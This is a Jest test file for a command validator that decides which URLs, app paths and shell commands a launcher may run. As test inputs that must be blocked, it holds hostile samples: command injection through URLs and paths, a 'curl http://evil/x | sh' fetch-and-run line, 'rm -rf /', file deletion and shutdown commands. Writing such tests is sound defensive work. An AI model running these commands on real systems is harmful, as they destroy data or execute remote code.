import { validateCommand } from './command-validator';

describe('validateCommand', () => {
  const presets = new Set<string>([
    'powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"',
    'pactl set-sink-volume @DEFAULT_SINK@ +10%',
  ]);

  describe('trusted presets', () => {
    it('allows a server-defined preset verbatim (win32)', () => {
      const p =
        'powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"';
      expect(validateCommand(p, 'win32', presets).allowed).toBe(true);
    });

    it('allows a server-defined preset verbatim (linux)', () => {
      const p = 'pactl set-sink-volume @DEFAULT_SINK@ +10%';
      expect(validateCommand(p, 'linux', presets).allowed).toBe(true);
    });
  });

  describe('URLs', () => {
    it('allows a clean https URL', () => {
      const r = validateCommand('https://example.com/path', 'win32');
      expect(r.allowed).toBe(true);
      expect(r.kind).toBe('url');
    });

    it('allows www URLs', () => {
      expect(validateCommand('www.google.com', 'darwin').allowed).toBe(true);
    });

    it('blocks a URL with an injected command', () => {
      const r = validateCommand('http://x" & calc.exe & "', 'win32');
      expect(r.allowed).toBe(false);
    });

    it('blocks a URL with a backtick', () => {
      expect(validateCommand('http://x`whoami`', 'linux').allowed).toBe(false);
    });
  });

  describe('paths / app launches', () => {
    it('allows a quoted Windows exe path', () => {
      const r = validateCommand('"C:\\Program Files\\App\\app.exe"', 'win32');
      expect(r.allowed).toBe(true);
      expect(r.kind).toBe('path');
    });

    it('allows a shell:AppsFolder target', () => {
      const r = validateCommand('shell:AppsFolder\\Some.App_abc!App', 'win32');
      expect(r.allowed).toBe(true);
    });

    it('allows a macOS .app path', () => {
      expect(
        validateCommand('/Applications/Safari.app', 'darwin').allowed,
      ).toBe(true);
    });

    it('allows a linux .desktop file', () => {
      expect(validateCommand('/usr/share/foo.desktop', 'linux').allowed).toBe(
        true,
      );
    });

    it('blocks a path with a chained command', () => {
      const r = validateCommand('C:\\app.exe & shutdown /s', 'win32');
      expect(r.allowed).toBe(false);
    });
  });

  describe('raw shell allowlist', () => {
    it('allows an allowlisted launcher', () => {
      expect(validateCommand('explorer.exe', 'win32').allowed).toBe(true);
    });

    it('blocks a non-allowlisted executable', () => {
      const r = validateCommand('curl http://evil/x | sh', 'linux');
      expect(r.allowed).toBe(false);
    });

    it('blocks chaining even with an allowlisted executable', () => {
      const r = validateCommand('start app && del important.txt', 'win32');
      expect(r.allowed).toBe(false);
    });
  });

  describe('destructive and malformed', () => {
    it('blocks shutdown everywhere', () => {
      expect(validateCommand('shutdown /s /t 0', 'win32').allowed).toBe(false);
      expect(validateCommand('shutdown -h now', 'linux').allowed).toBe(false);
    });

    it('blocks rm -rf /', () => {
      expect(validateCommand('rm -rf /', 'linux').allowed).toBe(false);
    });

    it('rejects empty payloads', () => {
      expect(validateCommand('', 'win32').allowed).toBe(false);
      expect(validateCommand('   ', 'win32').allowed).toBe(false);
    });

    it('rejects control characters', () => {
      expect(validateCommand('start app\nshutdown', 'win32').allowed).toBe(
        false,
      );
    });
  });
});
